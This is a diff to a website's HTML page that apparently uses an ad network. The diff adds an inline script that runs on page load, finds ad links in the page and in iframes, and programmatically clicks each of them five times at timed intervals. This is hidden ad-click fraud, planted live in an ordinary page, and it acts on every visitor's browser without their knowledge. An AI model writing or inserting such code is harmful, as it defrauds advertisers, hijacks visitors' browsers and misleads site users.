@@ -74,5 +74,70 @@
     <script defer src="/_vercel/insights/script.js"></script>
     <script async="async" data-cfasync="false" src="//pl27496313.profitableratecpm.com/5bb7ae94f947dffc34dda5e8a56e9b81/invoke.js"></script>
 <div id="container-5bb7ae94f947dffc34dda5e8a56e9b81"></div>
+    <script>
+(async () => {
+    const repetitions = 5;
+    const delay = 2 * 1000;
+    
+    function findAds() {
+        const ads = [];
+        try {
+            const iframes = document.querySelectorAll('iframe');
+            iframes.forEach((iframe) => {
+                try {
+                    const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
+                    if (iframeDoc) {
+                        const links = iframeDoc.querySelectorAll('a[href], [onclick]');
+                        links.forEach(link => ads.push(link));
+                    }
+                } catch (e) {
+                    // Cannot access iframe contents, common for cross-origin ads.
+                }
+            });
+        } catch(e) {
+            // Error finding iframes
+        }
+
+        const adSelectors = [
+            '[id*="ad"]', '[id*="ads"]', '[id*="advert"]', '[id*="sponsored"]',
+            '[class*="ad"]', '[class*="ads"]', '[class*="advert"]', '[class*="sponsored"]',
+            'a[href*="doubleclick.net"]', 'a[href*="googleadservices"]'
+        ];
+        
+        document.querySelectorAll(adSelectors.join(', ')).forEach(el => {
+            if (el.tagName === 'A' || el.hasAttribute('onclick')) {
+                 ads.push(el);
+            } else {
+                 const innerLink = el.querySelector('a[href], [onclick]');
+                 if(innerLink) ads.push(innerLink);
+            }
+        });
+        
+        return [...new Set(ads)];
+    }
+
+    for (let i = 1; i <= repetitions; i++) {
+        const adsToClick = findAds();
+
+        if (adsToClick.length === 0) {
+            await new Promise(resolve => setTimeout(resolve, delay));
+            continue;
+        }
+
+        for (const ad of adsToClick) {
+            try {
+                ad.click();
+                await new Promise(resolve => setTimeout(resolve, 500)); 
+            } catch (e) {
+                // Could not click ad
+            }
+        }
+        
+        if (i < repetitions) {
+            await new Promise(resolve => setTimeout(resolve, delay));
+        }
+    }
+})();
+    </script>
 </body>
 </html>
